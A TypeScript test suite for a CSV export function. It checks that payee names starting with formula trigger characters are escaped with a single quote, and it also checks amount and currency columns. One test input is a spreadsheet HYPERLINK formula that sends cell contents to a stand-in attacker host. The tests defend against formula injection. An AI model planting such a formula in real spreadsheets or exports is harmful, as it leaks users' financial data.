import { parse as csvParse } from 'csv-parse/sync';

import { exportToCSV } from './export-to-csv';

describe('exportToCSV', () => {
  const accounts = [{ id: 'a1', name: 'Checking' }];
  const categoryGroups = [
    { name: 'Income', categories: [{ id: 'c1', name: 'Salary' }] },
  ];

  function makeTransaction(overrides: Record<string, unknown> = {}) {
    return {
      account: 'a1',
      date: '2026-01-01',
      payee: 'p1',
      notes: '',
      category: 'c1',
      amount: 10000,
      cleared: false,
      reconciled: false,
      ...overrides,
    };
  }

  async function payeeCell(payeeName: string, amount = 10000) {
    const csv = await exportToCSV(
      [makeTransaction({ amount })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: payeeName }],
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    return { row: rows[0], csv };
  }

  it.each([
    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
    ['=1+1'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(1+1)'],
    ['\tHELLO'],
    ['\rHELLO'],
  ])('prefixes a payee starting with %j with a single quote', async payload => {
    const { row } = await payeeCell(payload);
    expect(row.Payee).toBe("'" + payload);
  });

  it('does not prefix payees without a leading trigger character', async () => {
    const { row } = await payeeCell('Acme Corp');
    expect(row.Payee).toBe('Acme Corp');
  });

  it('does not prefix negative numeric amounts', async () => {
    const { row } = await payeeCell('Acme', -2500);
    expect(row.Amount).toBe('-25');
  });

  it('has no currency column when no account has its own currency', async () => {
    const { csv } = await payeeCell('Acme');
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    expect(Object.keys(rows[0])).toEqual([
      'Account',
      'Date',
      'Payee',
      'Notes',
      'Category',
      'Amount',
      'Cleared',
      'Reconciled',
    ]);
  });

  it('exports amounts with the currency of their account', async () => {
    const csv = await exportToCSV(
      [
        makeTransaction({ account: 'a1', amount: 10050 }),
        // ¥1,234, stored with two implied decimals like every amount
        makeTransaction({ account: 'a2', amount: 123400 }),
      ],
      [...accounts, { id: 'a2', name: 'Tokyo', currency: 'JPY' }],
      categoryGroups,
      [{ id: 'p1', name: 'Acme' }],
      'CAD',
    );
    const rows = csvParse(csv, { columns: true }) as Array<
      Record<string, string>
    >;
    expect(rows.map(row => [row.Account, row.Amount, row.Currency])).toEqual([
      ['Checking', '100.5', 'CAD'],
      ['Tokyo', '1234', 'JPY'],
    ]);
  });
});
